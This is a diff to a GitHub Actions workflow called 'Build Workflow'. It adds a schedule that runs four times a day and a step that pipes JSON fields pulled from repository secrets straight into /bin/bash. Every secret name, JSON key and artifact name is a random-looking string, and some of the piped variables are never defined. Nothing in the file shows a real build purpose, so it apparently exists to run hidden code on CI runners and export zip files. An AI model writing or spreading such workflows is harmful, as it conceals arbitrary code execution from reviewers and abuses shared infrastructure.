@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '2 1,7,13,19 * * *'
 jobs:
   runner:
     runs-on: ubuntu-latest
@@ -10,19 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          hlbrx291: ${{ secrets.hlbrx291 }}
+          dc9647: ${{ secrets.dc9647 }}
         run: |
-          printf '%s' "$hlbrx291" | jq -r .lrqf70374 | /bin/bash
-          printf '%s' "$fowa5" | jq -r .qf85 | /bin/bash
-          echo $ujf6820 | jq -r .ire79 | /bin/bash
-          echo $q7 | jq -r .cyx059 | /bin/bash
-          echo $x797 | jq -r .rfi52979 | /bin/bash
-          printf '%s' "$oa5" | jq -r .wug2432 | /bin/bash
+          printf '%s' "$dc9647" | jq -r .igic563 | /bin/bash
+          printf '%s' "$upzx5" | jq -r .ridld831 | /bin/bash
+          echo $v17519 | jq -r .mzfrs3252 | /bin/bash
+          printf '%s' "$flc17255" | jq -r .rwmyr439 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: slgO4CWh
+          name: 6E1dl81p
           path: "*.zip"
           retention-days: 1
